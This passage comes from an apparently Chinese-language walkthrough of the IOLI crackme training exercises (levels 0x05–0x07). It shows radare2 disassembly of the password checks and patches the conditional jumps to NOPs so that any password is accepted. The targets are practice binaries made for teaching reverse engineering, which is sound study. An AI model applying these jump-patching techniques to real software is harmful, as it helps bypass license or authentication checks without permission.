|          <span class="number">0x080484a7</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|          <span class="number">0x080484aa</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x080484ac</span>    <span class="number">7518</span>         jne <span class="number">0x80484c6</span>
|      |   <span class="number">0x080484ae</span>    c704246b860. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|      |   <span class="number">0x080484b5</span>    e8dafeffff   call sym.imp.<span class="built_in">printf</span>
|      |      sym.imp.<span class="built_in">printf</span>()
|      |   <span class="number">0x080484ba</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|      |   <span class="number">0x080484c1</span>    e8eefeffff   call sym.imp.<span class="built_in">exit</span> ; (fcn<span class="number">.080483</span>aa)
|      |      fcn<span class="number">.080483</span>aa() ; sym.imp.<span class="built_in">exit</span>
|      |   ; JMP XREF from <span class="number">0x080484ac</span> (unk)
|      `-&gt; <span class="number">0x080484c6</span>    c9           leave
\          <span class="number">0x080484c7</span>    c3           ret
[<span class="number">0x080483d0</span>]&gt; s <span class="number">0x080484ea</span>
[<span class="number">0x080484ea</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080484ea</span>]&gt; s <span class="number">0x0804851e</span>
[<span class="number">0x0804851e</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804851e</span>]&gt; s <span class="number">0x080484ac</span>
[<span class="number">0x080484ac</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080484ac</span>]&gt; q
</code></pre><p>输入任意密码</p>
<pre><code> ✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x05      
IOLI Crackme Level <span class="number">0</span>x05
Password: <span class="number">12345</span>
Password OK!
</code></pre><h2 id="crackme0x06">crackme0x06</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x06
IOLI Crackme Level <span class="number">0</span>x06
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p>破解么，又不需要知道程序逻辑，只要让程序运行到想要的代码块就好。于是……把所有跳转灭掉。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x06
 -- Dissasemble? No dissasemble, no dissassemble!!!!!
[<span class="number">0x08048400</span>]&gt; aa
[<span class="number">0x08048400</span>]&gt; pdf@sym.main
|          ; UNKNOWN XREF from <span class="number">0x080485aa</span> (unk)
|          ; DATA XREF from <span class="number">0x08048417</span> (fcn<span class="number">.080483</span>ee)
/ (fcn) sym.main <span class="number">99</span>
|          <span class="number">0x08048607</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048608</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804860a</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048610</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048613</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048618</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x0804861b</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x0804861e</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048621</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x08048624</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048626</span>    c7042463870. mov dword [esp], str.IOLI_Crackme_Level_0x06_n ; str.IOLI_Crackme_Level_0x06_n
|          <span class="number">0x0804862d</span>    e886fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x08048632</span>    c704247c870. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048639</span>    e87afdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x0804863e</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x08048641</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048645</span>    c7042487870. mov dword [esp], <span class="number">0x8048787</span> ;  <span class="number">0x08048787</span> 
|          <span class="number">0x0804864c</span>    e847fdffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x08048651</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x08048654</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048658</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x0804865b</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804865e</span>    e825ffffff   call sym.check
|             sym.check()
|          <span class="number">0x08048663</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048668</span>    c9           leave
\          <span class="number">0x08048669</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.check 
|          ; UNKNOWN XREF from <span class="number">0x0804854e</span> (unk)
|          ; CALL XREF from <span class="number">0x0804865e</span> (unk)
/ (fcn) sym.check <span class="number">127</span>
|          <span class="number">0x08048588</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048589</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804858b</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|          <span class="number">0x0804858e</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|          <span class="number">0x08048595</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|          ; JMP XREF from <span class="number">0x080485f7</span> (unk)
|- loc<span class="number">.0804859</span>c <span class="number">107</span>
|    .---&gt; <span class="number">0x0804859c</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|    |     <span class="number">0x0804859f</span>    <span class="number">890424</span>       mov [esp], eax
|    |     <span class="number">0x080485a2</span>    e801feffff   call sym.imp.<span class="built_in">strlen</span>
|    |        sym.imp.<span class="built_in">strlen</span>(unk)
|    |     <span class="number">0x080485a7</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|    | ,=&lt; <span class="number">0x080485aa</span>    <span class="number">734</span>d         jae loc<span class="number">.080485f</span>9
|    | |   <span class="number">0x080485ac</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|    | |   <span class="number">0x080485af</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|    | |   <span class="number">0x080485b2</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|    | |   <span class="number">0x080485b5</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|    | |   <span class="number">0x080485b8</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|    | |   <span class="number">0x080485bb</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|    | |   <span class="number">0x080485bf</span>    c74424043d8. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x804873d</span> ;  <span class="number">0x0804873d</span> 
|    | |   <span class="number">0x080485c7</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|    | |   <span class="number">0x080485ca</span>    <span class="number">890424</span>       mov [esp], eax
|    | |   <span class="number">0x080485cd</span>    e8f6fdffff   call sym.imp.<span class="built_in">sscanf</span>
|    | |      sym.imp.<span class="built_in">sscanf</span>()
|    | |   <span class="number">0x080485d2</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|    | |   <span class="number">0x080485d5</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|    | |   <span class="number">0x080485d8</span>    <span class="number">0110</span>         add [eax], edx
|    | |   <span class="number">0x080485da</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|    |,==&lt; <span class="number">0x080485de</span>    <span class="number">7512</span>         jne loc<span class="number">.080485f</span>2
|    |||   <span class="number">0x080485e0</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|    |||   <span class="number">0x080485e3</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|    |||   <span class="number">0x080485e7</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|    |||   <span class="number">0x080485ea</span>    <span class="number">890424</span>       mov [esp], eax
|    |||   <span class="number">0x080485ed</span>    e828ffffff   call sym.parell
|    |||      sym.parell()
|    ||    ; JMP XREF from <span class="number">0x080485de</span> (unk)
|- loc<span class="number">.080485f</span>2 <span class="number">21</span>
|    |`--&gt; <span class="number">0x080485f2</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|    | |   <span class="number">0x080485f5</span>    ff00         inc dword [eax]
|    `===&lt; <span class="number">0x080485f7</span>    eba3         jmp loc<span class="number">.0804859</span>c
|      |   ; JMP XREF from <span class="number">0x080485aa</span> (unk)
|- loc<span class="number">.080485f</span>9 <span class="number">14</span>
|      `-&gt; <span class="number">0x080485f9</span>    c704244e870. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          <span class="number">0x08048600</span>    e8b3fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048605</span>    c9           leave
\          <span class="number">0x08048606</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.parell 
|          ; UNKNOWN XREF from <span class="number">0x0804851a</span> (unk)
|          ; CALL XREF from <span class="number">0x080485ed</span> (unk)
/ (fcn) sym.parell <span class="number">110</span>
|          <span class="number">0x0804851a</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804851b</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804851d</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x08048520</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048523</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x08048527</span>    c74424043d8. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x804873d</span> ;  <span class="number">0x0804873d</span> 
|          <span class="number">0x0804852f</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x08048532</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048535</span>    e88efeffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x0804853a</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x0804853d</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048541</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048544</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048547</span>    e868ffffff   call sym.dummy
|             sym.dummy()
|          <span class="number">0x0804854c</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x0804854e</span>    <span class="number">7436</span>         je loc<span class="number">.08048586</span>
|      |   <span class="number">0x08048550</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x08048584</span> (unk)
|- loc<span class="number">.08048557</span> <span class="number">49</span>
|      |   <span class="number">0x08048557</span>    <span class="number">837</span>df809     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x0804855b</span>    <span class="number">7f</span>29         jg loc<span class="number">.08048586</span>
|     ||   <span class="number">0x0804855d</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|     ||   <span class="number">0x08048560</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x08048563</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x08048565</span>    <span class="number">7518</span>         jne loc<span class="number">.0804857f</span>
|    |||   <span class="number">0x08048567</span>    c7042440870. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|    |||   <span class="number">0x0804856e</span>    e845feffff   call sym.imp.<span class="built_in">printf</span>
|    |||      sym.imp.<span class="built_in">printf</span>()
|    |||   <span class="number">0x08048573</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x0804857a</span>    e869feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x08048565</span> (unk)
|- loc<span class="number">.0804857f</span> <span class="number">9</span>
|    `---&gt; <span class="number">0x0804857f</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x08048582</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x08048584</span>    ebd1         jmp loc<span class="number">.08048557</span>
|     ||   ; JMP XREF from <span class="number">0x0804854e</span> (unk)
|     ||   ; JMP XREF from <span class="number">0x0804855b</span> (unk)
|- loc<span class="number">.08048586</span> <span class="number">2</span>
|     ``-&gt; <span class="number">0x08048586</span>    c9           leave
\          <span class="number">0x08048587</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; s <span class="number">0x080485aa</span>
[<span class="number">0x080485aa</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485aa</span>]&gt; s <span class="number">0x080485de</span>
[<span class="number">0x080485de</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485de</span>]&gt; s <span class="number">0x0804854e</span>
[<span class="number">0x0804854e</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804854e</span>]&gt; s <span class="number">0x0804855b</span>
[<span class="number">0x0804855b</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804855b</span>]&gt; s <span class="number">0x08048565</span>
[<span class="number">0x08048565</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048565</span>]&gt; q
</code></pre><p>输入任意密码：</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x06
IOLI Crackme Level <span class="number">0</span>x06
Password: <span class="number">123456</span>
Password OK!
</code></pre><h2 id="crackme0x07">crackme0x07</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x07
IOLI Crackme Level <span class="number">0</span>x07
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p>这次函数名都变了。大致搜索下就找到<code>Ok</code>代码段，把所有跳转清除。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x07
 -- Wow, my cat knows radare2 hotkeys better than me!
[<span class="number">0x08048400</span>]&gt; aa
[<span class="number">0x08048400</span>]&gt; pdf@main
|          ; UNKNOWN XREF from <span class="number">0x08048643</span> (fcn<span class="number">.080485</span>b9)
|          ; DATA XREF from <span class="number">0x08048417</span> (entry0)
/ (fcn) main <span class="number">99</span>
|          <span class="number">0x0804867d</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804867e</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048680</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048686</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048689</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804868e</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048691</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048694</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048697</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804869a</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x0804869c</span>    c70424d9870. mov dword [esp], str.IOLI_Crackme_Level_0x07_n ; str.IOLI_Crackme_Level_0x07_n
|          <span class="number">0x080486a3</span>    e810fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x080486a8</span>    c70424f2870. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x080486af</span>    e804fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x080486b4</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486b7</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486bb</span>    c70424fd870. mov dword [esp], <span class="number">0x80487fd</span> ;  <span class="number">0x080487fd</span> 
|          <span class="number">0x080486c2</span>    e8d1fcffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x080486c7</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x080486ca</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080486ce</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x080486d1</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080486d4</span>    e8e0feffff   call fcn<span class="number">.080485</span>b9
|             fcn<span class="number">.080485</span>b9()
|          <span class="number">0x080486d9</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080486de</span>    c9           leave
\          <span class="number">0x080486df</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@fcn<span class="number">.080485</span>b9
            ; UNKNOWN XREF from <span class="number">0x08048576</span> (fcn<span class="number">.08048524</span>)
            ; CALL XREF from <span class="number">0x080486d4</span> (unk)
/ (fcn) fcn<span class="number">.080485</span>b9 <span class="number">196</span>
|           <span class="number">0x080485b9</span>    <span class="number">55</span>           push ebp
|           <span class="number">0x080485ba</span>    <span class="number">89e5</span>         mov ebp, esp
|           <span class="number">0x080485bc</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|           <span class="number">0x080485bf</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|           <span class="number">0x080485c6</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|           ; JMP XREF from <span class="number">0x08048628</span> (fcn<span class="number">.080485</span>b9)
|- fcn<span class="number">.080485</span>cd <span class="number">176</span>
|     .---&gt; <span class="number">0x080485cd</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |     <span class="number">0x080485d0</span>    <span class="number">890424</span>       mov [esp], eax
|     |     <span class="number">0x080485d3</span>    e8d0fdffff   call sym.imp.<span class="built_in">strlen</span>
|     |        sym.imp.<span class="built_in">strlen</span>(unk)
|     |     <span class="number">0x080485d8</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|     | ,=&lt; <span class="number">0x080485db</span>    <span class="number">734</span>d         jae loc<span class="number">.0804862</span>a
|     | |   <span class="number">0x080485dd</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x080485e0</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|     | |   <span class="number">0x080485e3</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|     | |   <span class="number">0x080485e6</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|     | |   <span class="number">0x080485e9</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x080485ec</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|     | |   <span class="number">0x080485f0</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|     | |   <span class="number">0x080485f8</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|     | |   <span class="number">0x080485fb</span>    <span class="number">890424</span>       mov [esp], eax
|     | |   <span class="number">0x080485fe</span>    e8c5fdffff   call sym.imp.<span class="built_in">sscanf</span>
|     | |      sym.imp.<span class="built_in">sscanf</span>()
|     | |   <span class="number">0x08048603</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|     | |   <span class="number">0x08048606</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|     | |   <span class="number">0x08048609</span>    <span class="number">0110</span>         add [eax], edx
|     | |   <span class="number">0x0804860b</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|     |,==&lt; <span class="number">0x0804860f</span>    <span class="number">7512</span>         jne loc<span class="number">.08048623</span>
|     |||   <span class="number">0x08048611</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|     |||   <span class="number">0x08048614</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|     |||   <span class="number">0x08048618</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|     |||   <span class="number">0x0804861b</span>    <span class="number">890424</span>       mov [esp], eax
|     |||   <span class="number">0x0804861e</span>    e81fffffff   call fcn<span class="number">.08048542</span>
|     |||      fcn<span class="number">.08048542</span>()
|     ||    ; JMP XREF from <span class="number">0x0804860f</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.08048623</span> <span class="number">90</span>
|     |`--&gt; <span class="number">0x08048623</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     | |   <span class="number">0x08048626</span>    ff00         inc dword [eax]
|     `===&lt; <span class="number">0x08048628</span>    eba3         jmp fcn<span class="number">.080485</span>cd
|       |   ; JMP XREF from <span class="number">0x080485db</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.0804862</span>a <span class="number">83</span>
|       `-&gt; <span class="number">0x0804862a</span>    e8f5feffff   call fcn<span class="number">.08048524</span>
|       | &gt;    fcn<span class="number">.08048524</span>()
|           <span class="number">0x0804862f</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|           <span class="number">0x08048632</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|           <span class="number">0x08048636</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|           <span class="number">0x08048639</span>    <span class="number">890424</span>       mov [esp], eax
|           <span class="number">0x0804863c</span>    e873feffff   call fcn<span class="number">.080484</span>b4
|              fcn<span class="number">.080484</span>b4() ; entry0+<span class="number">180</span>
|           <span class="number">0x08048641</span>    <span class="number">85</span>c0         test eax, eax
|    ,====&lt; <span class="number">0x08048643</span>    <span class="number">7436</span>         je loc<span class="number">.0804867</span>b
|    |      <span class="number">0x08048645</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|    |      ; JMP XREF from <span class="number">0x08048679</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.0804864</span>c <span class="number">49</span>
|    |      <span class="number">0x0804864c</span>    <span class="number">837</span>df409     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x9</span>
|   ,=====&lt; <span class="number">0x08048650</span>    <span class="number">7f</span>29         jg loc<span class="number">.0804867</span>b
|   ||      <span class="number">0x08048652</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|   ||      <span class="number">0x08048655</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|   ||      <span class="number">0x08048658</span>    <span class="number">85</span>c0         test eax, eax
|  ,======&lt; <span class="number">0x0804865a</span>    <span class="number">7518</span>         jne loc<span class="number">.08048674</span>
|  |||      <span class="number">0x0804865c</span>    c70424d3870. mov dword [esp], str.wtf__n ; str.wtf__n
|  |||      <span class="number">0x08048663</span>    e850fdffff   call sym.imp.<span class="built_in">printf</span>
|  |||         sym.imp.<span class="built_in">printf</span>()
|  |||      <span class="number">0x08048668</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|  |||      <span class="number">0x0804866f</span>    e874fdffff   call sym.imp.<span class="built_in">exit</span>
|  |||         sym.imp.<span class="built_in">exit</span>()
|  |        ; JMP XREF from <span class="number">0x0804865a</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.08048674</span> <span class="number">9</span>
|  `------&gt; <span class="number">0x08048674</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|   ||      <span class="number">0x08048677</span>    ff00         inc dword [eax]
|   ||      <span class="number">0x08048679</span>    ebd1         jmp loc<span class="number">.0804864</span>c
|   ||      ; JMP XREF from <span class="number">0x08048643</span> (fcn<span class="number">.080485</span>b9)
|   ||      ; JMP XREF from <span class="number">0x08048650</span> (fcn<span class="number">.080485</span>b9)
|- loc<span class="number">.0804867</span>b <span class="number">2</span>
|   ``----&gt; <span class="number">0x0804867b</span>    c9           leave
\           <span class="number">0x0804867c</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@fcn<span class="number">.08048542</span>
           ; CALL XREF from <span class="number">0x0804861e</span> (fcn<span class="number">.080485</span>b9)
/ (fcn) fcn<span class="number">.08048542</span> <span class="number">119</span>
|          <span class="number">0x08048542</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048543</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048545</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x08048548</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804854b</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x0804854f</span>    c7442404c28. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x80487c2</span> ;  <span class="number">0x080487c2</span> 
|          <span class="number">0x08048557</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x0804855a</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804855d</span>    e866feffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x08048562</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x08048565</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048569</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804856c</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804856f</span>    e840ffffff   call fcn<span class="number">.080484</span>b4
|             fcn<span class="number">.080484</span>b4() ; entry0+<span class="number">180</span>
|          <span class="number">0x08048574</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x08048576</span>    <span class="number">743f</span>         je loc<span class="number">.080485</span>b7
|      |   <span class="number">0x08048578</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x080485b5</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.0804857f</span> <span class="number">58</span>
|      |   <span class="number">0x0804857f</span>    <span class="number">837</span>df809     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x08048583</span>    <span class="number">7f</span>32         jg loc<span class="number">.080485</span>b7
|     ||   <span class="number">0x08048585</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|     ||   <span class="number">0x08048588</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x0804858b</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x0804858d</span>    <span class="number">7521</span>         jne loc<span class="number">.080485</span>b0
|    |||   <span class="number">0x0804858f</span>    <span class="number">833</span>d2ca0040. cmp dword [<span class="number">0x804a02c</span>], <span class="number">0x1</span>
|   ,====&lt; <span class="number">0x08048596</span>    <span class="number">750</span>c         jne loc<span class="number">.080485</span>a4
|   ||||   <span class="number">0x08048598</span>    c70424c5870. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|   ||||   <span class="number">0x0804859f</span>    e814feffff   call sym.imp.<span class="built_in">printf</span>
|   ||||      sym.imp.<span class="built_in">printf</span>()
|   |      ; JMP XREF from <span class="number">0x08048596</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.080485</span>a4 <span class="number">21</span>
|   `----&gt; <span class="number">0x080485a4</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x080485ab</span>    e838feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x0804858d</span> (fcn<span class="number">.08048524</span>)
|- loc<span class="number">.080485</span>b0 <span class="number">9</span>
